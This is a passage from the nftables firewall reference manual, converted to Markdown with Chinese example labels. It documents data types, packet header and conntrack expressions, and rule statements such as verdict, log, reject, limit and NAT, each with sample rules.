character strings. A string begins with an alphabetic character (a-zA-Z) followed by zero or more alphanumeric characters or the characters /, -, _ and .. In addition anything enclosed in double quotes (\\") is recognized as a string.\\n\\n\\n***\u793a\u4f8b 4. String specification***\\n\\n~~~\\n\\n# Interface name\\nfilter input iifname eth0\\n\\n# Weird interface name\\nfilter input iifname \\"(eth0)\\"\\n\\n~~~\\n\\n\\n\\n### Link layer address type\\n\\n\\n***Table 12.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| Link layer address | lladdr | variable | integer |\\n\\n\\nThe link layer address type is used for link layer addresses. Link layer addresses are specified as a variable amount of groups of two hexadecimal digits separated using colons (:).\\n\\n\\n***\u793a\u4f8b 5. Link layer address specification***\\n\\n~~~\\n\\n# Ethernet destination MAC address\\nfilter input ether daddr 20:c9:d0:43:12:d9\\n\\n~~~\\n\\n\\n\\n### IPv4 address type\\n\\n\\n***Table 13.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| IPv4 address | ipv4_addr | 32 bit | integer |\\n\\n\\nThe IPv4 address type is used for IPv4 addresses. Addresses are specified in either dotted decimal, dotted hexadecimal, dotted octal, decimal, hexadecimal, octal notation or as a host name. A host name will be resolved using the standard system resolver.\\n\\n\\n***\u793a\u4f8b 6. IPv4 address specification***\\n\\n~~~\\n# dotted decimal notation\\nfilter output ip daddr 127.0.0.1\\n\\n# host name\\nfilter output ip daddr localhost\\n\\n~~~\\n\\n\\n\\n### IPv6 address type\\n\\n\\n***Table 14.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| IPv6 address | ipv6_addr | 128 bit | integer |\\n\\n\\nThe IPv6 address type is used for IPv6 addresses. FIXME\\n\\n\\n***\u793a\u4f8b 7. IPv6 address specification***\\n\\n~~~\\n# abbreviated loopback address\\nfilter output ip6 daddr ::1\\n\\n~~~\\n\\n\\n\\n### Boolean type\\n\\n\\n***Table 15.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| Boolean | boolean | 1 bit | integer |\\n\\n\\nThe boolean type is a syntactical helper type in user space. It\'s use is in the right-hand side of a (typically implicit) relational expression to change the expression on the left-hand side into a boolean check (usually for existence).\\n\\nThe following keywords will automatically resolve into a boolean type with given value:\\n\\n\\n***Table 16.***\\n\\n| Keyword | Value |\\n| --- | --- |\\n| exists | 1 |\\n| missing | 0 |\\n\\n\\n***\u793a\u4f8b 8. Boolean specification***\\n\\nThe following expressions support a boolean comparison:\\n\\n\\n***Table 17.***\\n\\n| Expression | Behaviour |\\n| --- | --- |\\n| fib | Check route existence. |\\n| exthdr | Check IPv6 extension header existence. |\\n| tcp option | Check TCP option header existence. |\\n\\n\\n~~~\\n# match if route exists\\nfilter input fib daddr . iif oif exists\\n\\n# match only non-fragmented packets in IPv6 traffic\\nfilter input exthdr frag missing\\n\\n# match if TCP timestamp option is present\\nfilter input tcp option timestamp exists\\n\\n~~~\\n\\n\\n\\n\\n### ICMP Type type\\n\\n\\n***Table 18.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| ICMP Type | icmp_type | 8 bit | integer |\\n\\n\\nThe ICMP Type type is used to conveniently specify the ICMP header\'s type field.\\n\\nThe following keywords may be used when specifying the ICMP type:\\n\\n\\n***Table 19.***\\n\\n| Keyword | Value |\\n| --- | --- |\\n| echo-reply | 0 |\\n| destination-unreachable | 3 |\\n| source-quench | 4 |\\n| redirect | 5 |\\n| echo-request | 8 |\\n| router-advertisement | 9 |\\n| router-solicitation | 10 |\\n| time-exceeded | 11 |\\n| parameter-problem | 12 |\\n| timestamp-request | 13 |\\n| timestamp-reply | 14 |\\n| info-request | 15 |\\n| info-reply | 16 |\\n| address-mask-request | 17 |\\n| address-mask-reply | 18 |\\n\\n\\n\\n\\n***\u793a\u4f8b 9. ICMP Type specification***\\n\\n~~~\\n\\n# match ping packets\\nfilter output icmp type { echo-request, echo-reply }\\n\\n~~~\\n\\n\\n\\n\\n\\n\\n### ICMPv6 Type type\\n\\n\\n***Table 20.***\\n\\n| Name | Keyword | Size | Base type |\\n| --- | --- | --- | --- |\\n| ICMPv6 Type | icmpv6_type | 8 bit | integer |\\n\\n\\n\\nThe ICMPv6 Type type is used to conveniently specify the ICMPv6 header\'s type field.\\n\\nThe following keywords may be used when specifying the ICMPv6 type:\\n\\n\\n***Table 21.***\\n\\n| Keyword | Value |\\n| --- | --- |\\n| destination-unreachable | 1 |\\n| packet-too-big | 2 |\\n| time-exceeded | 3 |\\n| parameter-problem | 4 |\\n| echo-request | 128 |\\n| echo-reply | 129 |\\n| mld-listener-query | 130 |\\n| mld-listener-report | 131 |\\n| mld-listener-done | 132 |\\n| mld-listener-reduction | 132 |\\n| nd-router-solicit | 133 |\\n| nd-router-advert | 134 |\\n| nd-neighbor-solicit | 135 |\\n| nd-neighbor-advert | 136 |\\n| nd-redirect | 137 |\\n| router-renumbering | 138 |\\n| ind-neighbor-solicit | 141 |\\n| ind-neighbor-advert | 142 |\\n| mld2-listener-report | 143 |\\n\\n\\n***\u793a\u4f8b 10. ICMPv6 Type specification***\\n\\n~~~\\n\\n# match ICMPv6 ping packets\\nfilter output icmpv6 type { echo-request, echo-reply }\\n\\n~~~\\n\\n\\n\\n## Primary expressions\\n\\nThe lowest order expression is a primary expression, representing either a constant or a single datum from a packet\'s payload, meta data or a stateful module.\\n\\n\\n### Meta expressions\\n\\n`meta {length | nfproto | l4proto | protocol | priority}`\\n\\n`[meta] {mark | iif | iifname | iiftype | oif | oifname | oiftype}`\\n`[meta] {skuid | skgid | nftrace | rtclassid | ibriport | obriport | pkttype | cpu | iifgroup | oifgroup | cgroup | random}`\\n\\nA meta expression refers to meta data associated with a packet.\\n\\nThere are two types of meta expressions: unqualified and qualified meta expressions. Qualified meta expressions require the ***meta*** keyword before the meta key, unqualified meta expressions can be specified by using the meta key directly or as qualified meta expressions.\\n\\n\\n***Table 22. Meta expression types***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| length | Length of the packet in bytes | integer (32 bit) |\\n| protocol | Ethertype protocol value | ether_type |\\n| priority | TC packet priority | tc_handle |\\n| mark | Packet mark | mark |\\n| iif | Input interface index | iface_index |\\n| iifname | Input interface name | string |\\n| iiftype | Input interface type | iface_type |\\n| oif | Output interface index | iface_index |\\n| oifname | Output interface name | string |\\n| oiftype | Output interface hardware type | iface_type |\\n| skuid | UID associated with originating socket | uid |\\n| skgid | GID associated with originating socket | gid |\\n| rtclassid | Routing realm | realm |\\n| ibriport | Input bridge interface name | string |\\n| obriport | Output bridge interface name | string |\\n| pkttype | packet type | pkt_type |\\n| cpu | cpu number processing the packet | integer (32 bits) |\\n| iifgroup | incoming device group | devgroup |\\n| oifgroup | outgoing device group | devgroup |\\n| cgroup | control group id | integer (32 bits) |\\n| random | pseudo-random number | integer (32 bits) |\\n\\n\\n\\n\\n***Table 23. Meta expression specific types***\\n\\n| Type | Description |\\n| --- | --- |\\n| iface_index | Interface index (32 bit number). Can be specified numerically or as name of an existing interface. |\\n| ifname | Interface name (16 byte string). Does not have to exist. |\\n| iface_type | Interface type (16 bit number). |\\n| uid | User ID (32 bit number). Can be specified numerically or as user name. |\\n| gid | Group ID (32 bit number). Can be specified numerically or as group name. |\\n| realm | Routing Realm (32 bit number). Can be specified numerically or as symbolic name defined in /etc/iproute2/rt_realms. |\\n| devgroup_type | Device group (32 bit number). Can be specified numerically or as symbolic name defined in /etc/iproute2/group. |\\n| pkt_type | Packet type: Unicast (addressed to local host), Broadcast (to all), Multicast (to group). |\\n\\n\\n\\n\\n***\u793a\u4f8b 11. Using meta expressions***\\n\\n~~~\\n\\n# qualified meta expression\\nfilter output meta oif eth0\\n\\n# unqualified meta expression\\nfilter output oif eth0\\n\\n~~~\\n\\n\\n\\n\\n\\n\\n### fib expressions\\n\\n***fib*** \\\\{saddr | daddr [mark | iif | oif]]\\\\} \\\\{oif | oifname | type\\\\}\\n\\nA fib expression queries the fib (forwarding information base) to obtain information such as the output interface index a particular address would use. The input is a tuple of elements that is used as input to the fib lookup functions.\\n\\n\\n***Table 24. fib expression specific types***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| oif | Output interface index | integer (32 bit) |\\n| oifname | Output interface name | string |\\n| type | Address type | fib_addrtype |\\n\\n\\n\\n\\n***\u793a\u4f8b 12. Using fib expressions***\\n\\n~~~\\n\\n# drop packets without a reverse path\\nfilter prerouting fib saddr . iif oif missing drop\\n\\n# drop packets to address not configured on ininterface\\nfilter prerouting fib daddr . iif type != { local, broadcast, multicast } drop\\n\\n# perform lookup in a specific \'blackhole\' table (0xdead, needs ip appropriate ip rule)\\nfilter prerouting meta mark set 0xdead fib daddr . mark type vmap { blackhole : drop, prohibit : jump prohibited, unreachable : drop }\\n\\n~~~\\n\\n\\n\\n\\n\\n\\n### Routing expressions\\n\\n***rt*** \\\\{classid | nexthop\\\\}\\n\\nA routing expression refers to routing data associated with a packet.\\n\\n\\n***Table 25. Routing expression types***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| classid | Routing realm | realm |\\n| nexthop | Routing nexthop | ipv4_addr/ipv6_addr |\\n\\n\\n\\n\\n***Table 26. Routing expression specific types***\\n\\n| Type | Description |\\n| --- | --- |\\n| realm | Routing Realm (32 bit number). Can be specified numerically or as symbolic name defined in /etc/iproute2/rt_realms. |\\n\\n\\n\\n\\n***\u793a\u4f8b 13. Using routing expressions***\\n\\n~~~\\n\\n# IP family independent rt expression\\nfilter output rt classid 10\\n\\n# IP family dependent rt expressions\\nip filter output rt nexthop 192.168.0.1\\nip6 filter output rt nexthop fd00::1\\ninet filter meta nfproto ipv4 output rt nexthop 192.168.0.1\\ninet filter meta nfproto ipv6 output rt nexthop fd00::1\\n\\n~~~\\n\\n\\n\\n\\n\\n\\n\\n\\n## Payload expressions\\n\\nPayload expressions refer to data from the packet\'s payload.\\n\\n\\n### Ethernet header expression\\n\\n***ether*** [_ethernet header field_]\\n\\n\\n***Table 27. Ethernet header expression types***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| daddr | Destination MAC address | ether_addr |\\n| saddr | Source MAC address | ether_addr |\\n| type | EtherType | ether_type |\\n\\n\\n\\n\\n\\n\\n### VLAN header expression\\n\\n***vlan*** [_VLAN header field_]\\n\\n\\n***Table 28. VLAN header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| id | VLAN ID (VID) | integer (12 bit) |\\n| cfi | Canonical Format Indicator | integer (1 bit) |\\n| pcp | Priority code point | integer (3 bit) |\\n| type | EtherType | ether_type |\\n\\n\\n\\n### ARP header expression\\n\\n***arp*** [_ARP header field_]\\n\\n\\n***Table 29. ARP header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| htype | ARP hardware type | integer (16 bit) |\\n| ptype | EtherType | ether_type |\\n| hlen | Hardware address len | integer (8 bit) |\\n| plen | Protocol address len | integer (8 bit) |\\n| operation | Operation | arp_op |\\n\\n\\n\\n\\n\\n\\n### IPv4 header expression\\n\\n***ip*** [_IPv4 header field_]\\n\\n\\n***Table 30. IPv4 header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| version | IP header version (4) | integer (4 bit) |\\n| hdrlength | IP header length including options | integer (4 bit) FIXME scaling |\\n| dscp | Differentiated Services Code Point | dscp |\\n| ecn | Explicit Congestion Notification | ecn |\\n| length | Total packet length | integer (16 bit) |\\n| id | IP ID | integer (16 bit) |\\n| frag-off | Fragment offset | integer (16 bit) |\\n| ttl | Time to live | integer (8 bit) |\\n| protocol | Upper layer protocol | inet_proto |\\n| checksum | IP header checksum | integer (16 bit) |\\n| saddr | Source address | ipv4_addr |\\n| daddr | Destination address | ipv4_addr |\\n\\n\\n\\n\\n\\n\\n### ICMP header expression\\n\\n***icmp*** [_ICMP header field_]\\n\\n\\n***Table 31. ICMP header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| type | ICMP type field | icmp_type |\\n| code | ICMP code field | integer (8 bit) |\\n| checksum | ICMP checksum field | integer (16 bit) |\\n| id | ID of echo request/response | integer (16 bit) |\\n| sequence | sequence number of echo request/response | integer (16 bit) |\\n| gateway | gateway of redirects | integer (32 bit) |\\n| mtu | MTU of path MTU discovery | integer (16 bit) |\\n\\n\\n\\n\\n\\n\\n### IPv6 header expression\\n\\n***ip6*** [_IPv6 header field_]\\n\\n\\n***Table 32. IPv6 header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| version | IP header version (6) | integer (4 bit) |\\n| dscp | Differentiated Services Code Point | dscp |\\n| ecn | Explicit Congestion Notification | ecn |\\n| flowlabel | Flow label | integer (20 bit) |\\n| length | Payload length | integer (16 bit) |\\n| nexthdr | Nexthdr protocol | inet_proto |\\n| hoplimit | Hop limit | integer (8 bit) |\\n| saddr | Source address | ipv6_addr |\\n| daddr | Destination address | ipv6_addr |\\n\\n\\n\\n\\n\\n\\n### ICMPv6 header expression\\n\\n***icmpv6*** [_ICMPv6 header field_]\\n\\n\\n***Table 33. ICMPv6 header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| type | ICMPv6 type field | icmpv6_type |\\n| code | ICMPv6 code field | integer (8 bit) |\\n| checksum | ICMPv6 checksum field | integer (16 bit) |\\n| parameter-problem | pointer to problem | integer (32 bit) |\\n| packet-too-big | oversized MTU | integer (32 bit) |\\n| id | ID of echo request/response | integer (16 bit) |\\n| sequence | sequence number of echo request/response | integer (16 bit) |\\n| max-delay | maximum response delay of MLD queries | integer (16 bit) |\\n\\n\\n\\n\\n\\n\\n### TCP header expression\\n\\n***tcp*** [_TCP header field_]\\n\\n\\n***Table 34. TCP header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| sport | Source port | inet_service |\\n| dport | Destination port | inet_service |\\n| sequence | Sequence number | integer (32 bit) |\\n| ackseq | Acknowledgement number | integer (32 bit) |\\n| doff | Data offset | integer (4 bit) FIXME scaling |\\n| reserved | Reserved area | integer (4 bit) |\\n| flags | TCP flags | tcp_flag |\\n| window | Window | integer (16 bit) |\\n| checksum | Checksum | integer (16 bit) |\\n| urgptr | Urgent pointer | integer (16 bit) |\\n\\n\\n\\n\\n\\n\\n### UDP header expression\\n\\n***udp*** [_UDP header field_]\\n\\n\\n***Table 35. UDP header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| sport | Source port | inet_service |\\n| dport | Destination port | inet_service |\\n| length | Total packet length | integer (16 bit) |\\n| checksum | Checksum | integer (16 bit) |\\n\\n\\n\\n\\n\\n\\n### UDP-Lite header expression\\n\\n***udplite*** [_UDP-Lite header field_]\\n\\n\\n***Table 36. UDP-Lite header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| sport | Source port | inet_service |\\n| dport | Destination port | inet_service |\\n| checksum | Checksum | integer (16 bit) |\\n\\n\\n\\n\\n\\n\\n### SCTP header expression\\n\\n***sctp*** [_SCTP header field_]\\n\\n\\n***Table 37. SCTP header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| sport | Source port | inet_service |\\n| dport | Destination port | inet_service |\\n| vtag | Verfication Tag | integer (32 bit) |\\n| checksum | Checksum | integer (32 bit) |\\n\\n\\n\\n\\n\\n\\n### DCCP header expression\\n\\n***dccp*** [_DCCP header field_]\\n\\n\\n***Table 38. DCCP header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| sport | Source port | inet_service |\\n| dport | Destination port | inet_service |\\n\\n\\n\\n\\n\\n\\n### Authentication header expression\\n\\n***ah*** [_AH header field_]\\n\\n\\n***Table 39. AH header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| nexthdr | Next header protocol | inet_proto |\\n| hdrlength | AH Header length | integer (8 bit) |\\n| reserved | Reserved area | integer (16 bit) |\\n| spi | Security Parameter Index | integer (32 bit) |\\n| sequence | Sequence number | integer (32 bit) |\\n\\n\\n\\n\\n\\n\\n### Encrypted security payload header expression\\n\\n***esp*** [_ESP header field_]\\n\\n\\n***Table 40. ESP header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| spi | Security Parameter Index | integer (32 bit) |\\n| sequence | Sequence number | integer (32 bit) |\\n\\n\\n\\n\\n\\n\\n### IPcomp header expression\\n\\n***comp*** [_IPComp header field_]\\n\\n\\n***Table 41. IPComp header expression***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| nexthdr | Next header protocol | inet_proto |\\n| flags | Flags | bitmask |\\n| cpi | Compression Parameter Index | integer (16 bit) |\\n\\n\\n\\n\\n\\n\\n### Extension header expressions\\n\\nExtension header expressions refer to data from variable-sized protocol headers, such as IPv6 extension headers and TCPs options.\\n\\nnftables currently supports matching (finding) a given ipv6 extension header or TCP option.\\n\\n`hbh {nexthdr | hdrlength}`\\n\\n`frag {nexthdr | frag-off | more-fragments | id}`\\n\\n`rt {nexthdr | hdrlength | type | seg-left}`\\n\\n`dst {nexthdr | hdrlength}`\\n\\n`mh {nexthdr | hdrlength | checksum | type}`\\n\\n`tcp option {eol | noop | maxseg | window | sack-permitted | sack | sack0 | sack1 | sack2 | sack3 | timestamp} [_tcp_option_field_]`\\n\\nThe following syntaxes are valid only in a relational expression with boolean type on right-hand side for checking header existence only:\\n\\n`exthdr {hbh | frag | rt | dst | mh}`\\n\\n`tcp option {eol | noop | maxseg | window | sack-permitted | sack | sack0 | sack1 | sack2 | sack3 | timestamp}`\\n\\n\\n***Table 42. IPv6 extension headers***\\n\\n| Keyword | Description |\\n| --- | --- |\\n| hbh | Hop by Hop |\\n| rt | Routing Header |\\n| frag | Fragmentation header |\\n| dst | dst options |\\n| mh | Mobility Header |\\n\\n\\n\\n\\n***Table 43. TCP Options***\\n\\n| Keyword | Description | TCP option fields |\\n| --- | --- | --- |\\n| eol | End of option list | kind |\\n| noop | 1 Byte TCP No-op options | kind |\\n| maxseg | TCP Maximum Segment Size | kind, length, size |\\n| window | TCP Window Scaling | kind, length, count |\\n| sack-permitted | TCP SACK permitted | kind, length |\\n| sack | TCP Selective Acknowledgement (alias of block 0) | kind, length, left, right |\\n| sack0 | TCP Selective Acknowledgement (block 0) | kind, length, left, right |\\n| sack1 | TCP Selective Acknowledgement (block 1) | kind, length, left, right |\\n| sack2 | TCP Selective Acknowledgement (block 2) | kind, length, left, right |\\n| sack3 | TCP Selective Acknowledgement (block 3) | kind, length, left, right |\\n| timestamp | TCP Timestamps | kind, length, tsval, tsecr |\\n\\n\\n\\n\\n***\u793a\u4f8b 14. finding TCP options***\\n\\n~~~\\nfilter input tcp option sack-permitted kind 1 counter\\n~~~\\n\\n\\n\\n\\n***\u793a\u4f8b 15. matching IPv6 exthdr***\\n\\n~~~\\nip6 filter input frag more-fragments 1 counter\\n~~~\\n\\n\\n\\n### Conntrack expressions\\n\\nConntrack expressions refer to meta data of the connection tracking entry associated with a packet.\\n\\nThere are three types of conntrack expressions. Some conntrack expressions require the flow direction before the conntrack key, others must be used directly because they are direction agnostic. The ***packets***, ***bytes*** and ***avgpkt*** keywords can be used with or without a direction. If the direction is omitted, the sum of the original and the reply direction is returned. The same is true for the ***zone***, if a direction is given, the zone is only matched if the zone id is tied to the given direction.\\n\\n`ct {state | direction | status | mark | expiration | helper | label | l3proto | protocol | bytes | packets | avgpkt | zone}`\\n\\n`ct {original | reply} {l3proto | protocol | saddr | daddr | proto-src | proto-dst | bytes | packets | avgpkt | zone}`\\n\\n\\n***Table 44. Conntrack expressions***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| state | State of the connection | ct_state |\\n| direction | Direction of the packet relative to the connection | ct_dir |\\n| status | Status of the connection | ct_status |\\n| mark | Connection mark | mark |\\n| expiration | Connection expiration time | time |\\n| helper | Helper associated with the connection | string |\\n| label | Connection tracking label bit or symbolic name defined in connlabel.conf in the nftables include path | ct_label |\\n| l3proto | Layer 3 protocol of the connection | nf_proto |\\n| saddr | Source address of the connection for the given direction | ipv4_addr/ipv6_addr |\\n| daddr | Destination address of the connection for the given direction | ipv4_addr/ipv6_addr |\\n| protocol | Layer 4 protocol of the connection for the given direction | inet_proto |\\n| proto-src | Layer 4 protocol source for the given direction | integer (16 bit) |\\n| proto-dst | Layer 4 protocol destination for the given direction | integer (16 bit) |\\n| packets | packet count seen in the given direction or sum of original and reply | integer (64 bit) |\\n| bytes | bytecount seen, see description for ***packets*** keyword | integer (64 bit) |\\n| avgpkt | average bytes per packet, see description for ***packets*** keyword | integer (64 bit) |\\n| zone | conntrack zone | integer (16 bit) |\\n\\n\\n\\n\\n## Statements\\n\\nStatements represent actions to be performed. They can alter control flow (return, jump to a different chain, accept or drop the packet) or can perform actions, such as logging, rejecting a packet, etc.\\n\\nStatements exist in two kinds. Terminal statements unconditionally terminate evaluation of the current rule, non-terminal statements either only conditionally or never terminate evaluation of the current rule, in other words, they are passive from the ruleset evaluation perspective. There can be an arbitrary amount of non-terminal statements in a rule, but only a single terminal statement as the final statement.\\n\\n\\n### Verdict statement\\n\\nThe verdict statement alters control flow in the ruleset and issues policy decisions for packets.\\n\\n`{accept | drop | queue | continue | return}`\\n\\n`{jump | goto} {chain}`\\n\\n\\n`accept`\\n\\n<dd>\\n\\nTerminate ruleset evaluation and accept the packet.\\n\\n</dd>\\n\\n`drop`\\n\\n<dd>\\n\\nTerminate ruleset evaluation and drop the packet.\\n\\n</dd>\\n\\n`queue`\\n\\n<dd>\\n\\nTerminate ruleset evaluation and queue the packet to userspace.\\n\\n</dd>\\n\\n`continue`\\n\\n<dd>\\n\\nContinue ruleset evaluation with the next rule. FIXME\\n\\n</dd>\\n\\n`return`\\n\\n<dd>\\n\\nReturn from the current chain and continue evaluation at the next rule in the last chain. If issued in a base chain, it is equivalent to ***accept***.\\n\\n</dd>\\n\\n`jump chain`\\n\\n<dd>\\n\\nContinue evaluation at the first rule in chain. The current position in the ruleset is pushed to a call stack and evaluation will continue there when the new chain is entirely evaluated of a ***return*** verdict is issued.\\n\\n</dd>\\n\\n`goto chain`\\n\\n<dd>\\n\\nSimilar to ***jump***, but the current position is not pushed to the call stack, meaning that after the new chain evaluation will continue at the last chain instead of the one containing the goto statement.\\n\\n</dd>\\n\\n\\n\\n\\n***\u793a\u4f8b 16. Verdict statements***\\n\\n~~~\\n# process packets from eth0 and the internal network in from_lan\\n# chain, drop all packets from eth0 with different source addresses.\\n\\nfilter input iif eth0 ip saddr 192.168.0.0/24 jump from_lan\\nfilter input iif eth0 drop\\n~~~\\n\\n\\n\\n### Payload statement\\n\\nThe payload statement alters packet content. It can be used for example to set ip DSCP (differv) header field or ipv6 flow labels.\\n\\n\\n***\u793a\u4f8b 17. route some packets instead of bridging***\\n\\n~~~\\n# redirect tcp:http from 192.160.0.0/16 to local machine for routing instead of bridging\\n# assumes 00:11:22:33:44:55 is local MAC address.\\nbridge input meta iif eth0 ip saddr 192.168.0.0/16 tcp dport 80 meta pkttype set unicast ether daddr set 00:11:22:33:44:55\\n~~~\\n\\n\\n***\u793a\u4f8b 18. Set IPv4 DSCP header field***\\n\\n~~~\\nip forward ip dscp set 42\\n~~~\\n\\n\\n\\n### Log statement\\n\\n`log [prefix _quoted_string_] [level _syslog-level_] [flags log-flags]`\\n\\n`log [group _nflog_group_] [prefix _quoted_string_] [queue-threshold value] [snaplen size]`\\n\\nThe log statement enables logging of matching packets. When this statement is used from a rule, the Linux kernel will print some information on all matching packets, such as header fields, via the kernel log (where it can be read with dmesg(1) or read in the syslog). If the group number is specified, the Linux kernel will pass the packet to nfnetlink_log which will multicast the packet through a netlink socket to the specified multicast group. One or more userspace processes may subscribe to the group to receive the packets, see libnetfilter_queue documentation for details. This is a non-terminating statement, so the rule evaluation continues after the packet is logged.\\n\\n\\n***Table 45. log statement options***\\n\\n| Keyword | Description | Type |\\n| --- | --- | --- |\\n| prefix | Log message prefix | quoted string |\\n| syslog-level | Syslog level of logging | string: emerg, alert, crit, err, warn [default], notice, info, debug |\\n| group | NFLOG group to send messages to | unsigned integer (16 bit) |\\n| snaplen | Length of packet payload to include in netlink message | unsigned integer (32 bit) |\\n| queue-threshold | Number of packets to queue inside the kernel before sending them to userspace | unsigned integer (32 bit) |\\n\\n\\n\\n\\n***Table 46. log-flags***\\n\\n| Flag | Description |\\n| --- | --- |\\n| tcp sequence | Log TCP sequence numbers. |\\n| tcp options | Log options from the TCP packet header. |\\n| ip options | Log options from the IP/IPv6 packet header. |\\n| skuid | Log the userid of the process which generated the packet. |\\n| ether | Decode MAC addresses and protocol. |\\n| all | Enable all log flags listed above. |\\n\\n\\n\\n\\n***\u793a\u4f8b 19. Using log statement***\\n\\n~~~\\n# log the UID which generated the packet and ip options\\nip filter output log flags skuid flags ip options\\n\\n# log the tcp sequence numbers and tcp options from the TCP packet\\nip filter output log flags tcp sequence,options\\n\\n# enable all supported log flags\\nip6 filter output log flags all\\n~~~\\n\\n\\n### Reject statement\\n\\n`reject [with] {icmp | icmp6 | icmpx} [type] {icmp_type | icmp6_type | icmpx_type}`\\n\\n`reject [with] {tcp} {reset}`\\n\\nA reject statement is used to send back an error packet in response to the matched packet otherwise it is equivalent to drop so it is a terminating statement, ending rule traversal. This statement is only valid in the input, forward and output chains, and user-defined chains which are only called from those chains.\\n\\n\\n***Table 47. reject statement type (ip)***\\n\\n| Value | Description | Type |\\n| --- | --- | --- |\\n| icmp_type | ICMP type response to be sent to the host | net-unreachable, host-unreachable, prot-unreachable, port-unreachable [default], net-prohibited, host-prohibited, admin-prohibited |\\n\\n\\n\\n\\n***Table 48. reject statement type (ip6)***\\n\\n| Value | Description | Type |\\n| --- | --- | --- |\\n| icmp6_type | ICMPv6 type response to be sent to the host | no-route, admin-prohibited, addr-unreachable, port-unreachable [default], policy-fail, reject-route |\\n\\n\\n***Table 49. reject statement type (inet)***\\n\\n| Value | Description | Type |\\n| --- | --- | --- |\\n| icmpx_type | ICMPvXtype abstraction response to be sent to the host, this is a set of types that overlap in IPv4 and IPv6 to be used from the inet family. | port-unreachable [default], admin-prohibited, no-route, host-unreachable |\\n\\n\\n\\n### Counter statement\\n\\nA counter statement sets the hit count of packets along with the number of bytes.\\n\\n`counter {packets _number_ } {bytes _number_ }`\\n\\n\\n\\n### Conntrack statement\\n\\nThe conntrack statement can be used to set the conntrack mark and conntrack labels.\\n\\n`ct {mark | eventmask | label | zone} [set] value`\\n\\nThe ct statement sets meta data associated with a connection. The zone id has to be assigned before a conntrack lookup takes place, i.e. this has to be done in prerouting and possibly output (if locally generated packets need to be placed in a distinct zone), with a hook priority of -300.\\n\\n\\n***Table 50. Conntrack statement types***\\n\\n| Keyword | Description | Value |\\n| --- | --- | --- |\\n| eventmask | conntrack event bits | bitmask, integer (32 bit) |\\n| helper | name of ct helper object to assign to the connection | quoted string |\\n| mark | Connection tracking mark | mark |\\n| label | Connection tracking label | label |\\n| zone | conntrack zone | integer (16 bit) |\\n\\n\\n\\n\\n***\u793a\u4f8b 20. save packet nfmark in conntrack***\\n\\n~~~\\nct mark set meta mark\\n~~~\\n\\n\\n\\n\\n***\u793a\u4f8b 21. set zone mapped via interface***\\n\\n~~~\\ntable inet raw {\\n  chain prerouting {\\n      type filter hook prerouting priority -300;\\n      ct zone set iif map { \\"eth1\\" : 1, \\"veth1\\" : 2 }\\n  }\\n  chain output {\\n      type filter hook output priority -300;\\n      ct zone set oif map { \\"eth1\\" : 1, \\"veth1\\" : 2 }\\n  }\\n}\\n~~~\\n\\n\\n\\n\\n***\u793a\u4f8b 22. restrict events reported by ctnetlink***\\n\\n~~~\\nct eventmask set new or related or destroy\\n~~~\\n\\n\\n\\n### Meta statement\\n\\nA meta statement sets the value of a meta expression. The existing meta fields are: priority, mark, pkttype, nftrace.\\n\\n`meta {mark | priority | pkttype | nftrace} [set] value`\\n\\nA meta statement sets meta data associated with a packet.\\n\\n\\n***Table 51. Meta statement types***\\n\\n| Keyword | Description | Value |\\n| --- | --- | --- |\\n| priority | TC packet priority | tc_handle |\\n| mark | Packet mark | mark |\\n| pkttype | packet type | pkt_type |\\n| nftrace | ruleset packet tracing on/off. Use ***monitor trace*** command to watch traces | 0, 1 |\\n\\n\\n\\n### Limit statement\\n\\n`limit [rate] [over]_packet_number_ [/] {second | minute | hour | day} [burst _packet_number_ packets]`\\n\\n`limit [rate] [over]_byte_number_ {bytes | kbytes | mbytes} [/] {second | minute | hour | day | week} [burst _byte_number_ bytes]`\\n\\nA limit statement matches at a limited rate using a token bucket filter. A rule using this statement will match until this limit is reached. It can be used in combination with the log statement to give limited logging. The ***over*** keyword, that is optional, makes it match over the specified rate.\\n\\n\\n***Table 52. limit statement values***\\n\\n| Value | Description | Type |\\n| --- | --- | --- |\\n| packet_number | Number of packets | unsigned integer (32 bit) |\\n| byte_number | Number of bytes | unsigned integer (32 bit) |\\n\\n\\n\\n### NAT statements\\n\\n`snat [to _address_ [:port]] [persistent, random, fully-random]`\\n\\n`snat [to _address_ - _address_ [:_port_ - _port_]] [persistent, random, fully-random]`\\n\\n`dnat [to _address_ [:_port_]] [persistent, random, fully-random]`\\n\\n`dnat [to _address_ [:_port_ - _port_]] [persistent, random, fully-random]`\\n\\n`masquerade [to [:_port_]] [persistent, random, fully-random]`\\n\\n`masquerade [to [:_port_ - _port_]] [persistent, random, fully-random]`\\n\\n`redirect [to [:_port_]] [persistent, random, fully-random]`\\n\\n`redirect [to [:_port_ - _port_]] [persistent, random, fully-random]`\\n\\nThe nat statements are only valid from nat chain types.\\n\\nThe ***snat*** and ***masquerade*** statements specify that the source address of the packet should be modified. While ***snat*** is only valid in the postrouting and input chains, ***masquerade*** makes sense only in postrouting. The 